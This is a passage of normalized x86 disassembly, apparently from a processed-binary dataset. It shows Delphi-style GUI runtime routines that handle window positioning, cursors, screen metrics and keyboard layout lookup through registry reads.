mov dl 0x5
mov eax [ ebp - 0x8 ]
call sub_42bc24
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_42c8c4
mov ecx eax
inc ecx
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_44cbc8
mov eax [ ebp - 0x10 ]
call sub_44cd60
push eax
mov eax [ ebp - 0x10 ]
call sub_44cf24
mov edx eax
mov eax [ ebp - 0x8 ]
pop ecx
call sub_42c8e8
mov eax [ ebp - 0x10 ]
call sub_44cd60
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421fd8
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41d71c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42ca2c
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
dec edx
lea eax [ ebp - 0x10 ]
call sub_44d04c
jmp r-xdata
sub al 0x3
jne r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov al [ eax + edx - 0x1 ]
sub al 0xa
je r-xdata
sub_421fe0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43264c
mov eax [ ebp - 0x4 ]
call sub_43284c
test eax eax
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4215fc
sub_422010
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc50
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea eax [ ebp - 0x1c ]
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov edx [ ebp - 0x4 ]
pop ecx
mov bx 0xffd1
call sub_44c24c
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_422070
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43284c
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_4220a4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43354c
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x2
sub_4220dc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x2
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42018c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8b ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43284c
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetWindowPos
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
push 0xa2
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call PostMessageA
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x216 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_432880
or ecx 0xffffffff
mov dl 0x1
call sub_42d320
jmp r-xdata
sub_422198
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_433bd4
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax [ ebp - 0x4 ]
call sub_42df28
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x90 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_42c198
lea ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
or edx 0xffffffff
mov bx 0xffd1
call sub_44c24c
sub_422208
push ebp
mov ebp esp
add esp 0xffffffec
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4222f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_42c8c4
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_44cbc8
mov eax [ ebp - 0xc ]
call sub_44cd60
push eax
mov eax [ ebp - 0xc ]
call sub_44cf24
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
pop ecx
call sub_42c8e8
mov eax [ ebp - 0xc ]
call sub_44cd60
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_42ca2c
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4222fd
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x47 ]
mov eax [ ebp - 0x4 ]
call sub_41d71c
jmp r-xdata
mov edx [ ebp - 0x10 ]
dec edx
lea eax [ ebp - 0xc ]
call sub_44d04c
jmp r-xdata
sub al 0x3
jne r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov al [ eax + edx - 0x1 ]
sub al 0xa
je r-xdata
sub_422304
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_432be4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
xor edx edx
call sub_42bc24
pop ecx
pop ecx
pop ebp
retn
sub_42232c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_433838
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x8
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43284c
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_432880
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x47 ]
call sub_42c838
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
sub_422388
push ebp
mov ebp esp
add esp 0xffffffd0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] 0x28
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4223bc
push ebp
mov ebp esp
add esp 0xffffffd0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] 0x28
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4223f0
push ebp
mov ebp esp
add esp 0xffffffd0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] 0x28
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_422424
push ebp
mov ebp esp
add esp 0xffffffd0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] 0x28
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_422458
push ebp
mov ebp esp
add esp 0xfffffff0
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442100
mov eax [ ebp - 0x4 ]
call sub_42296c
push 0x0
call GetKeyboardLayout
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x48 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x70 ] eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
push 0x5a
mov eax [ ebp - 0x10 ]
push eax
call GetDeviceCaps
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax sub_41e284
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40e7d8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x78 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40e7d8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40e7d8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
mov eax [ ebp - 0x4 ]
call sub_422e7c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_422d04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_422d04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_422d04
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4225c8
push ebp
mov ebp esp
add esp 0xfffffff0
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
call sub_44c070
mov eax [ ebp - 0x4 ]
call sub_4229e0
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44215c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
call sub_43c464
call sub_44c070
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
sub_4226ac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_4226cc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_4226ec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42270c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42272c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42274c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42276c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_422790
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_4227c8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_4227ec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_422808
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_42282c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_422848
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x5c ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x58 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_4228c8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_43c264
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c264
mov eax [ rw-data ]
call sub_425ae0
sub_422910
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_43c728
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c728
mov eax [ rw-data ]
call sub_425ae0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x74 ]
call sub_435fd8
sub_42296c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] eax
mov [ ebp - 0x8 ] 0xffffffea
cmp [ ebp - 0x8 ] 0xffffffeb
jne r-xdata
cmp [ ebp - 0x8 ] 0xfffffff4
jle r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0xffffffef
jl r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0xc ]
push eax
call LoadCursorA
mov ecx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_422a74
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
sub_4229e0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0xffffffef
jl r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
push eax
call DestroyCursor
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0xffffffeb
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0xfffffff4
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call DestroyCursor
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov edx 0xc
mov eax [ ebp - 0x8 ]
call sub_44ba74
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_422a74
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax 0xc
call sub_44ba5c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0x10 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x50 ] eax
mov esp ebp
pop ebp
retn
sub_422abc
push ebp
mov ebp esp
add esp 0xfffffd98
push ebx
xor edx edx
mov [ ebp - 0x268 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422c87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422c8e
lea eax [ ebp - 0x268 ]
call sub_44cae0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x2c
call sub_44cae0
lea eax [ ebp - 0x11c ]
push eax
push 0x40
call GetKeyboardLayoutList
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x19 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov dl 0x1
call sub_43e988
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec [ ebp - 0x1c ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
mov eax [ ebp + eax * 4 - 0x11c ]
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x260 ] 0x0
lea ecx [ ebp - 0x264 ]
mov edx r-xdata
lea eax [ ebp - 0x25c ]
call sub_446f20
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ ebp + eax * 4 - 0x11c ]
call sub_439e70
test al al
je r-xdata
xor eax eax
push ebp
push sub_422c3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x14 ] 0x100
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x268 ]
lea edx [ ebp - 0x21c ]
mov ecx 0x100
call sub_44cd10
mov edx [ ebp - 0x268 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + eax * 4 - 0x11c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax [ ebp - 0x10 ]
mov eax [ ebp + eax * 4 - 0x11c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x2c
lea edx [ ebp - 0x21c ]
mov ecx 0x100
call sub_44cd10
sub_422cdc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422abc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_44cb34
pop ecx
pop ecx
pop ebp
retn
sub_422d24
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_422d48
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_422d64
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
